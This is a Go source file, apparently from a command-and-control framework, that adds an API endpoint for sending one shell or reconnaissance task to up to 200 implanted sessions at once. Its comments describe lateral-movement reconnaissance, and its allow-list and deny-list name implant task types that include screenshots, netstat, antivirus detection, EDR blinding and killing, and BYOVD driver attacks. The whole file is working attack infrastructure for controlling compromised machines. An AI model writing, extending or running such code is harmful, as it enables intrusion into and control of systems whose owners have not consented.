package api

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"

	"toshell/internal/common/avops"
	"toshell/internal/server/logging"
	"toshell/internal/server/task"
)

// ─── 批量任务下发（v1.4.1）──────────────────────────────────────────────────
//
// 解决的问题：横向阶段要"一次给 20 台机器下发同一条侦察命令"，此前只能循环调
// 20 次 POST /sessions/{id}/interact（或界面上逐台点）。本接口把"一条任务 × N 个会话"
// 收进**一次请求**，并逐项返回结果 —— 语义上是 N 个独立下发的**汇总报告**，不是事务。
//
// 三条硬约束（与任务书对应）：
//
//  1. **逐项独立**：某一项失败（会话不存在 / 推送失败）不影响其它项，也不整体 5xx；
//     只有"完全无法解析的请求体"与"目标列表非法（空/超上限）"才 400。
//  2. **一条审计**：一次批量 = 一条 tasks_bulk 审计记录（目标数 + 成功/失败计数 +
//     失败原因分布），不展开成 N 条噪声。
//  3. **复用既有守卫**：危险动作（avops.TaskNoRetry，与断线重连补发的判定同源）与
//     白名单外的类型一律**拒绝**，且拒绝按"逐项失败"传播，绝不整体放行。
//
// 请求字段沿用 createTaskHandler 的同一套命名与语义（session_id↔session_ids、
// command / args / execute_type / timeout / task_type），不另造一套；`type` / `data`
// 仅作为示例形状的兼容别名，规范字段永远优先。

// bulkTasksMaxSessions 单次批量下发的会话上限。
//
// 为什么是 200：本 handler 在**一个请求内同步完成** N 次「建任务 + 推送」，每次建任务
// 都要拿任务管理器锁并写一条 sqlite 记录。200 台已覆盖"整批横向侦察"的真实规模
// （一个网段 / 一个资产分组）；再往上应该分批 —— 否则一次 HTTP 请求会长时间占住连接，
// 而且失败重试的粒度不可控（整批重发 = 对已经成功的会话再执行一次）。
const bulkTasksMaxSessions = 200

// bulkTasksAllowedTypes 批量下发允许的任务类型白名单。
//
// 口径：只允许"同一条命令/枚举动作在 N 台机器上重复执行也不产生副作用"的类型。
// 两类被刻意排除：
//   - **破坏性动作**（avops.TaskNoRetry 为 true：edr_blind / edr_kill / byovd_* /
//     ppl_kill / process_kill）：把同一个不可回滚的动作铺到 N 台机器上，必须逐机确认，
//     走既有的 /sessions/{id}/av-ops 分级入口；
//   - **需要逐机参数的类型**（file_list 的 path、injection 的 pid、byovd 的驱动字节）：
//     批量传同一个参数没有意义，且错配的后果不可控。
//
// 白名单之外的类型返回 task_type_not_allowed（逐项失败），不做"看起来像就放过去"的猜测。
var bulkTasksAllowedTypes = map[string]bool{
	task.TaskTypeCommand:    true,
	task.TaskTypeShell:      true,
	task.TaskTypeProcList:   true,
	task.TaskTypeScreenshot: true,
	// 植入端内置的侦察任务类型（见 internal/implant/main.go 的任务分发 switch）。
	"sysinfo":      true,
	"netstat":      true,
	"service_list": true,
	"av_detect":    true,
}

// bulkTaskItem 单台会话的下发结果。
//
// task_id 只在"任务真的建出来了"时出现（成功项，以及推送失败的失败项 —— 后者任务
// 已入库，可能由 HTTP 通道下一次心跳取走，操作员可据此继续查结果）；会话不存在等
// 前置失败没有 task_id。
type bulkTaskItem struct {
	SessionID string `json:"session_id"`
	OK        bool   `json:"ok"`
	TaskID    uint64 `json:"task_id,omitempty"`
	Error     string `json:"error,omitempty"`
}

// bulkTasksResponse 批量下发的汇总报告。total == succeeded + failed == len(items)。
type bulkTasksResponse struct {
	Total     int            `json:"total"`
	Succeeded int            `json:"succeeded"`
	Failed    int            `json:"failed"`
	Items     []bulkTaskItem `json:"items"`
}

// bulkTasksAuditEvent 一条批量下发审计事件（一次批量只写一条）。
//
// 与 avopsAuditEvent / moduleAuditEvent 同一思路：日志给人看，审计要能"可判定"。
// 不记命令内容（可能含凭据）；只记任务类型、目标数、成败计数、失败原因分布与会话 id。
type bulkTasksAuditEvent struct {
	At             time.Time      `json:"at"`
	Event          string         `json:"event"`
	TaskType       string         `json:"task_type"`
	Targets        int            `json:"targets"`
	Succeeded      int            `json:"succeeded"`
	Failed         int            `json:"failed"`
	FailureReasons map[string]int `json:"failure_reasons,omitempty"`
	SessionIDs     []string       `json:"session_ids,omitempty"`
	Detail         string         `json:"detail,omitempty"`
}

// bulkTasksAuditHook 批量下发审计事件的旁路接收器（nil = 只写日志）。
//
// 为什么用包级变量而不是 Server 字段：api.go 按任务书只允许增加一行路由注册，
// 不能新增结构体字段（有并行 agent 也在改该文件）。测试通过它断言"一次批量=一条审计"。
var bulkTasksAuditHook func(bulkTasksAuditEvent)

// auditBulkTasks 记录一条批量下发审计（默认写一行日志）。
func (s *Server) auditBulkTasks(ev bulkTasksAuditEvent) {
	if ev.At.IsZero() {
		ev.At = time.Now()
	}
	if bulkTasksAuditHook != nil {
		bulkTasksAuditHook(ev)
	}
	logging.Info("tasks-bulk", "audit event=%s task_type=%s targets=%d succeeded=%d failed=%d reasons=%s sessions=[%s] detail=%s",
		ev.Event, ev.TaskType, ev.Targets, ev.Succeeded, ev.Failed,
		bulkFailureReasonsText(ev.FailureReasons), strings.Join(ev.SessionIDs, ","), ev.Detail)
}

// bulkFailureReasonsText 把失败原因分布压成一行（按 map 遍历顺序不稳定的问题：
// 这里只用于日志展示，单测断言走事件结构体字段而不是这行文本）。
func bulkFailureReasonsText(reasons map[string]int) string {
	if len(reasons) == 0 {
		return "-"
	}
	parts := make([]string, 0, len(reasons))
	for k, v := range reasons {
		parts = append(parts, fmt.Sprintf("%s=%d", k, v))
	}
	return strings.Join(parts, ",")
}

// bulkTaskErrorCode 把任务管理器返回的错误归一成机器可读的 code。
//
// 会话不存在是**输入错误**（id 写错/会话已下线），批量语义下必须能一眼和真正的
// 服务端故障区分开，因此给固定 code=session_not_found；其余错误原样带回。
func bulkTaskErrorCode(err error) string {
	msg := err.Error()
	if strings.Contains(msg, "session not found") {
		return "session_not_found"
	}
	return msg
}

// bulkTasksHandler POST /api/v1/tasks/bulk
//
// 一次请求把同一条任务下发给多个会话，逐项返回结果。
// HTTP 200 = "批量已处理"（哪怕全部失败）；400 只用于请求本身不合法
// （body 不是合法 JSON / session_ids 为空 / 超过 bulkTasksMaxSessions）。
// bulkTasksMaxBodyBytes 批量任务端点（POST /api/v1/tasks/bulk）的请求体上限（审计 N2/M4 收口）。
//
// 1 MiB：body 是 1~bulkTasksMaxSessions 条“会话 ID + 同一条命令”。上限 100 个
// 会话 ID + 一条命令行，正常远小于 1 MiB；超限 413，不把超大 body 读进内存。
const bulkTasksMaxBodyBytes = 1 << 20

func (s *Server) bulkTasksHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	body, ok := readBodyLimited(w, r, bulkTasksMaxBodyBytes, "批量下发任务")
	if !ok {
		return
	}

	// 字段命名跟随 createTaskHandler（command/args/execute_type/timeout/task_type），
	// 只把单个 session_id 换成 session_ids。Type/Data 是示例形状的兼容别名：
	// 规范字段非空时永远优先，避免两套字段同时出现时行为不可判定。
	var payload struct {
		SessionIDs  []string `json:"session_ids"`
		Command     string   `json:"command"`
		Args        []string `json:"args"`
		ExecuteType string   `json:"execute_type"`
		Timeout     uint32   `json:"timeout"`
		TaskType    string   `json:"task_type"`
		Type        string   `json:"type"`
		Data        string   `json:"data"`
	}
	if err := json.Unmarshal(body, &payload); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}

	if len(payload.SessionIDs) == 0 {
		http.Error(w, `{"error":"session_ids is empty"}`, http.StatusBadRequest)
		return
	}
	if len(payload.SessionIDs) > bulkTasksMaxSessions {
		http.Error(w, fmt.Sprintf(`{"error":"too many session_ids: %d (max %d)"}`,
			len(payload.SessionIDs), bulkTasksMaxSessions), http.StatusBadRequest)
		return
	}

	taskType := strings.TrimSpace(payload.TaskType)
	if taskType == "" {
		taskType = strings.TrimSpace(payload.Type)
	}
	if taskType == "" {
		taskType = task.TaskTypeCommand
	}
	command := payload.Command
	if command == "" {
		command = payload.Data
	}

	// 类型级拒绝：对**每个目标**传播成逐项失败（不是整体 400/500）——操作员看到的
	// 是一份"N 台全部被拒 + 原因"的报告，和"部分会话不存在"是同一种可读形状。
	// 判定顺序刻意如此：先 avops（危险动作必须被明确标注为 destructive），
	// 再白名单（需要逐机参数 / 未登记的类型）。
	typeReject := ""
	switch {
	case avops.TaskNoRetry(taskType):
		typeReject = "destructive_task_forbidden"
	case !bulkTasksAllowedTypes[taskType]:
		typeReject = "task_type_not_allowed"
	}

	taskParams := task.TaskParams{
		Command:     command,
		Args:        payload.Args,
		ExecuteType: payload.ExecuteType,
		Timeout:     payload.Timeout,
		TaskType:    taskType,
	}

	items := make([]bulkTaskItem, 0, len(payload.SessionIDs))
	succeeded := 0
	failureReasons := make(map[string]int)
	dispatched := make([]string, 0, len(payload.SessionIDs))
	seen := make(map[string]bool, len(payload.SessionIDs))

	for _, raw := range payload.SessionIDs {
		sid := strings.TrimSpace(raw)

		// 去重：同一会话在一个请求里出现两次只下发一次。
		// 否则"同一条命令"会在同一台主机上执行两遍 —— 对侦察是浪费，对将来放宽的
		// 类型可能是重复副作用。total 因此是**去重后**的目标数。
		if sid != "" {
			if seen[sid] {
				continue
			}
			seen[sid] = true
		}

		item := bulkTaskItem{SessionID: sid}
		switch {
		case sid == "":
			item.Error = "empty_session_id"
		case typeReject != "":
			item.Error = typeReject
		case s.listener == nil:
			// 未装配监听器 = 任务建了也送不出去；不建任务，逐项报告。
			item.Error = "listener_unavailable"
		default:
			taskInfo, cerr := s.taskMgr.Create(sid, taskParams)
			if cerr != nil {
				item.Error = bulkTaskErrorCode(cerr)
				break
			}
			item.TaskID = taskInfo.ID
			// 与 interactSessionHandler 一致：创建之后真正推送。推送失败不删任务
			// （任务已入库，且非破坏性类型断线重连时会被补发），但本项必须如实失败。
			if perr := s.listener.PushTask(sid, taskInfo); perr != nil {
				item.Error = "push_failed: " + perr.Error()
			} else {
				dispatched = append(dispatched, sid)
			}
		}

		item.OK = item.Error == ""
		if item.OK {
			succeeded++
		} else {
			failureReasons[item.Error]++
		}
		items = append(items, item)
	}

	resp := bulkTasksResponse{
		Total:     len(items),
		Succeeded: succeeded,
		Failed:    len(items) - succeeded,
		Items:     items,
	}

	// **一条**审计：N 个目标 + 成功/失败计数 + 失败原因分布。
	// （被 400 拒绝的请求不进审计 —— 它们没有产生任何下发；见上方的 http.Error 分支。）
	s.auditBulkTasks(bulkTasksAuditEvent{
		Event:          "tasks_bulk",
		TaskType:       taskType,
		Targets:        len(items),
		Succeeded:      succeeded,
		Failed:         len(items) - succeeded,
		FailureReasons: failureReasons,
		SessionIDs:     dispatched,
		Detail:         typeReject,
	})

	json.NewEncoder(w).Encode(resp)
}
